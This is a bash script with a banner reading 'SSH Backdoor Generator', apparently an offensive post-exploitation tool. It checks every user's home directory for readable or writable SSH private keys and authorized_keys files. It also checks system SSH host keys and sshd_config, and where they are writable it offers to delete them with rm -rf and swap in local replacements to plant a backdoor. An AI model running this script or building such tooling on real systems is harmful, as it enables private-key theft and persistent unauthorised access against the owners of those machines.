pad=(/etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_dsa_key.pub /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_key.pub /etc/ssh/ssh_host_key)
arr=(.ssh/authorized_keys .ssh/identity.pub .ssh/identity .ssh/id_rsa.pub .ssh/id_rsa .ssh/id_dsa.pub .ssh/id_dsa )
red='\e[0;31m' 
yellow='\e[0;36m' 
echo "
███████╗░░██╗██╗
██╔════╝░██╔╝██║
█████╗░░██╔╝░██║
██╔══╝░░███████║
██║░░░░░╚════██║
╚═╝░░░░░░░░░░╚═╝ (by: https://beacons.ai/f4_zzz)

█▀ █▀ █░█   █▄▄ ▄▀█ █▀▀ █▄▀ █▀▄ █▀█ █▀█ █▀█   █▀▀ █▀▀ █▄░█ █▀▀ █▀█ ▄▀█ ▀█▀ █▀█ █▀█
▄█ ▄█ █▀█   █▄█ █▀█ █▄▄ █░█ █▄▀ █▄█ █▄█ █▀▄   █▄█ ██▄ █░▀█ ██▄ █▀▄ █▀█ ░█░ █▄█ █▀▄"

echo -e "\n${yellow}Yellow\e[0m -> Read"
echo -e "${red}Red\e[0m    -> Read and Write\n"
echo -e "-------------------------\n🆄🆂🅴🆁🆂"

verify(){
    if [ -r $1 -a -w $1 ]
        then
            echo -e "${red}$1\e[0m"
            return 2
    elif [ -r $1 ]
        then
            echo -e "${yellow}$1\e[0m"
            return 1
    else
        if [ -f $1 ]
            then
                echo $1
        return 0
        fi
    fi
}

for i in $(ls /home)
    do 
        echo && echo $i: 
    for file in ${arr[@]}
        do
            verify /home/$i/$file 
    done
done

echo -e "\n-------------------------\n🅲🅞🅽🅵🅸🅶 🅵🅸🅻🅴🆂:\n"
for file in ${pad[@]}
    do
        verify $file
        editopt=$?
        #echo $editopt
        if [ $editopt == 2 ]

        
            then
                read -r -p "Replace the file $file? [y/N] " editfile
                case $editfile in
                    [yY][eE][sS]|[yY])
                        locname=$(echo $file | cut -d "/" -f 4)
                        echo -e "File replaced: $file\n"
                        rm -rf $file
                        mv ./$locname /etc/ssh
                        ;;
                    *)
                        echo -e "NOT replace $file\n"
                        ;;
                esac
        fi
done

echo -e "\n-------------------------\n🆂🆂🅷-🅺🅴🆈🅶🅴🅽:\n"
read -r -p "Generate ssh key for your current user? [y/N] " keygenopt
case $keygenopt in
    [yY][eE][sS]|[yY])
        ssh-keygen
        echo "ssh key generated succesfuly :)"
        ;;
    *)
        echo -e "DON'T generate ssh key\n"
        ;;
esac
